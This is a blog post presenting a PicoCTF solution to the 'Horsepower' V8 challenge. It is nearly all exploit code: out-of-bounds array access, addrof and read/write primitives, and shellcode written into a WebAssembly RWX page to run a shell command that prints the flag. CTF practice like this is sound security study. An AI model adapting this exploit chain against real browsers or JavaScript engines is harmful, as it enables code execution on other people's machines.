---
layout: post
title: PicoCTF Horsepower - V8 exploitation
date: 2022-07-13
permalink: /:title/
description: "Solution to a V8 exploitation challenge"
tags: [ctf]
share: true
comments: false
published: true
status: ongoing
---

---
* toc
{:toc}
---

This is the solution to Horsepower, one of the simplest v8 challenges
available I solved one year ago or so.
Writeups can be found all over the internet so I'd rather not write
one of my own. Thanks to all the people that helped me!

![solution](/assets/img/d8-horsepower.png)

## Full exploit code

```javascript
1  var wasm_code = new Uint8Array([0, 97,
2      115, 109, 1, 0, 0, 0, 1,
3      133, 128, 128, 128, 0, 1,
4      96, 0, 1, 127, 3, 130, 128,
5      128, 128, 0, 1, 0, 4, 132,
6      128, 128, 128, 0, 1, 112, 0,
7      0, 5, 131, 128, 128, 128, 0,
8      1, 0, 1, 6, 129, 128, 128,
9      128, 0, 0, 7, 145, 128, 128,
10     128, 0, 2, 6, 109, 101, 109,
11     111, 114, 121, 2, 0, 4, 109,
12     97, 105, 110, 0, 0, 10, 138,
13     128, 128, 128, 0, 1, 132,
14     128, 128, 128, 0, 0, 65, 42,
15     11
16  ])
17  var wasm_mod = new WebAssembly.Module(
18      wasm_code)
19  var wasm_instance = new WebAssembly
20      .Instance(wasm_mod)
21  var f = wasm_instance.exports.main
22  var shellcode = [
23      0x48, 0xb8, 0x2f, 0x62, 0x69,
24      0x6e, 0x2f, 0x73, 0x68, 0x00,
25      0x99, 0x50,
26      0x54, 0x5f, 0x52, 0x66, 0x68,
27      0x2d, 0x63, 0x54, 0x5e, 0x52,
28      0xe8, 0x12,
29      0x00, 0x00, 0x00, 0x2f, 0x62,
30      0x69, 0x6e, 0x2f, 0x63, 0x61,
31      0x74, 0x20,
32      0x66, 0x6c, 0x61, 0x67, 0x2e,
33      0x74, 0x78, 0x74, 0x00, 0x56,
34      0x57, 0x54,
35      0x5e, 0x6a, 0x3b, 0x58, 0x0f,
36      0x05
37  ]
38  var buf = new ArrayBuffer(8)
39  var f64_buf = new Float64Array(buf)
40  var u64_buf = new Uint32Array(buf)
41  
42  function copy_shellcode(addr,
43  shellcode) {
44      print(
45          "[*] writing shellcode to RWX page...")
46      let buf = new ArrayBuffer(0x100)
47      let dataview = new DataView(buf)
48      let buf_addr = addrof(buf)
49      let backing_store_addr = buf_addr +
50          0x14n
51      print("[*] buf_addr:", hex(
52          buf_addr))
53      write(backing_store_addr, addr)
54      print("[*] backing_store_addr:",
55          hex(backing_store_addr))
56      for (let i = 0; i < shellcode
57          .length; i++) {
58          dataview.setUint8(i, shellcode[
59              i], true)
60      }
61      print(
62          "[*] shellcode writing successfully completed!")
63  }
64  
65  function hex(val) {
66      return "0x" + (val & 0xffffffffn)
67          .toString(16)
68  }
69  
70  function ftoi(
71  val) { // typeof(val) == float
72      f64_buf[0] = val
73      return BigInt(u64_buf[0]) + (BigInt(
74          u64_buf[1]) << 32n)
75  }
76  
77  function itof(
78  val) { // typeof(val) == BigInt
79      u64_buf[0] = Number(val &
80          0xffffffffn)
81      u64_buf[1] = Number(val >> 32n)
82      return f64_buf[0]
83  }
84  // allocate two adjacent objects in v8's heap
85  float_arr = [1.1, 1.2]
86  obj_arr = [{
87      a: 1
88  }, {
89      b: 2
90  }]
91  d = {}
92  // trigger the overflow
93  float_arr.setHorsepower(10)
94  // since element's content is placed right above the metadata of the
95  // object, simply accessing past its bound allows an attacker to read
96  // such values. The first one oob is the map value, the second the
97  // properties pointer, the third one the elements 
98  // pointer
99  float_map = ftoi(float_arr[2])
100  print("[*] float_map: ", hex(float_map))
101  // by inspecting memory, a float array has its properties pointer
102  // far past the second position, it is very likely an optimizaiton.
103  // Instead, at the second memory location its memory elements can
104  // be found
105  float_elements = ftoi(float_arr[3])
106  print("[*] float_elements: ", hex(
107      float_elements))
108  // by inspecting memory, it can be found that the two elements 
109  // pointer differ by 0x28
110  obj_elements = float_elements + 0x28n
111  print("[*] obj_elements: ", hex(
112      obj_elements))
113  
114  function addrof(obj) {
115      // make float_arr elements point to the elems. in the obj's 
116      // object
117      float_arr[3] = itof(obj_elements)
118      obj_arr[0] = obj
119      return ftoi(float_arr[0])
120  }
121  print("[*] addrof(float_arr): ", hex(
122      addrof(float_arr)))
123  
124  function read(addr) {
125      // change the elements points to the address to be read
126      addr = addr - 0x8n
127      if (addr % 2n == 0) {
128          addr += 0x1n
129      }
130      tmp_r = [1.1, 1.2]
131      tmp_r.setHorsepower(10)
132      tmp_r[3] = itof(addr)
133      return ftoi(tmp_r[0])
134  }
135  print("[*] obj_arr's addr content: ",
136      hex(read(addrof(obj_arr))))
137  
138  function write(addr, val) {
139      addr = addr - 0x8n
140      if (addr % 2n == 0) {
141          addr += 0x1n
142      }
143      tmp_w = [1.1, 1.2]
144      tmp_w.setHorsepower(10)
145      tmp_w[3] = itof(addr)
146      return tmp_w[0] = itof(val)
147  }
148  var rwx_page_addr = read(addrof(
149          wasm_instance) + 104n -
150      0x1n)
151  print("[*] wasm_instance addr: ", hex(
152      addrof(wasm_instance)))
153  print("[*] rwx page addr: ", hex(
154      rwx_page_addr))
155  copy_shellcode(rwx_page_addr, shellcode)
156  print("[*] wasm function addr: ", hex(
157      addrof(f)))
158  print("[*] getting code exec")
159  f()
```
